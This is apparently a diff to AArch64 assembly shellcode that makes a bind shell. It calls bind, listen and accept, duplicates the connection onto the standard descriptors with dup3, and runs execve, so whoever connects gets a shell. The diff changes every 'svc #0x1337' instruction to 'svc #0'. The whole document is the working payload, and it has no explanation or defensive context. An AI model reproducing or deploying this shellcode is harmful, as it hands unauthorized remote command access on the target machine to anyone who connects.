@@ -7,7 +7,7 @@ _start:
     lsr  x1, x8, #7
     lsl  x0, x1, #1
     mov  x2, xzr
-    svc  #0x1337
+    svc  #0
 
     // save s
     mvn  x4, x0
@@ -19,13 +19,13 @@ _start:
     add  x1, sp, x2
     mov  x2, #16
     mov  x8, #200
-    svc  #0x1337
+    svc  #0
 
     // listen(s, 2)
     mvn  x0, x4
     lsr  x1, x2, #3
     mov  x8, #201
-    svc  #0x1337
+    svc  #0
     mov  x5, x1
 
     // c = accept(s, 0, 0)
@@ -33,7 +33,7 @@ _start:
     mov  x1, xzr
     mov  x2, xzr
     mov  x8, #202
-    svc  #0x1337
+    svc  #0
 
     // save c
     mvn  x4, x0
@@ -45,7 +45,7 @@ dup3:
     lsr  x1, x1, #1
     mov  x2, xzr
     mov  x8, #24
-    svc  #0x1337
+    svc  #0
     mov  x10, xzr
     cmp  x10, x1
     bne  dup3
@@ -58,4 +58,4 @@ dup3:
     str  x3, [sp, #-16]!
     add  x0, sp, x1
     mov  x8, #221
-    svc  #0x1337
+    svc  #0
